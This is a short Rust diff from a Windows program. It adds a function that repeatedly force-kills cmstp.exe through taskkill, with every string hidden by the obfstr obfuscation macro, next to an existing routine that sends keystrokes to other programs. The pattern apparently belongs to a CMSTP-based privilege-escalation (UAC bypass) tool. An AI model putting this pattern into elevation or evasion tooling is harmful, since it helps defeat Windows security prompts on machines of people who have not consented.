@@ -4,7 +4,7 @@ use obfstr::obfstr as s;
 use std::fs::create_dir_all;
 use std::io::Write;
 use std::path::PathBuf;
-use std::{ env, ptr };
+use std::{ env, ptr, thread };
 use std::time::Duration;
 use std::{ fs, time::Instant };
 use winapi::{
@@ -27,7 +27,7 @@ use winapi::{
         },
     },
 };
-use crate::utils::functions::get_current_exe;
+use crate::utils::functions::{ call_program, get_current_exe };
 
 pub struct WindowInfo {
     name: String,
@@ -215,4 +215,28 @@ pub fn send_key_to_exe(exe_name: &str) -> bool {
         }
     }
     false
+}
+
+pub fn try_kill_cmstp() -> Result<()> {
+    let timeout_seconds = 5;
+    let mut cnt = 0;
+    loop {
+        if cnt >= timeout_seconds {
+            break;
+        }
+        let output = call_program(s!("taskkill"), Some(s!(r#"/IM cmstp.exe /F"#)))?;
+
+        let decoded_output = String::from_utf8_lossy(&output.stdout);
+
+        if
+            decoded_output.contains(s!("SUCCESS")) &&
+            decoded_output.contains(s!("has been terminated"))
+        {
+            return Ok(());
+        }
+        thread::sleep(std::time::Duration::from_secs(1));
+        cnt += 1;
+    }
+
+    Ok(())
 }
